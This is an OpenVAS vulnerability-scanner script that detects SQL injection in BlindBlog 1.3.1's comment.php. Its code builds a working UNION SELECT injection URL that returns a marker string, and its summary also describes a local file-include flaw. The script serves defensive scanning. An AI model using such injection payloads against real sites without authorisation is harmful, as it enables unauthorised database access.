###############################################################################
# OpenVAS Vulnerability Test
# $Id: BlindBlog_1_3_1.nasl 5767 2017-03-29 13:32:35Z cfi $
#
# BlindBlog Multiple Local File Include and SQL Injection
# Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "BlindBlog is prone to a local file-include vulnerability and
  multiple SQL-injection vulnerabilities because it fails to properly
  sanitize user-supplied input.

  An attacker can exploit the local file-include vulnerability using
  directory-traversal strings to view and execute arbitrary local
  files within the context of the webserver process. Information
  harvested may aid in further attacks.

  The attacker can exploit the SQL-injection vulnerabilities to
  compromise the application, access or modify data, or exploit latent
  vulnerabilities in the underlying database.

  BlindBlog 1.3.1 is vulnerable; other versions may also be affected.";

if(description)
{
 script_id(100031);
 script_version("$Revision: 5767 $");
 script_tag(name:"last_modification", value:"$Date: 2017-03-29 15:32:35 +0200 (Wed, 29 Mar 2017) $");
 script_tag(name:"creation_date", value:"2009-03-10 08:40:52 +0100 (Tue, 10 Mar 2009)");
 script_bugtraq_id(33980);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("BlindBlog Multiple Local File Include and SQL Injection Vulnerabilities");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

foreach dir( make_list_unique( "/blog", "/cbblog", "/blindblog", cgi_dirs( port:port ) ) ) { 

  if( dir == "/" ) dir = "";
  url = string(dir, "/comment.php?id=-1%27%20UNION%20ALL%20SELECT%20NULL,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,3,4%20FROM%20cblog_users%23");

  if(http_vuln_check(port:port, url:url,pattern:"Author:.*<a href.*>OpenVAS-SQL-Injection-Test</a>")) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );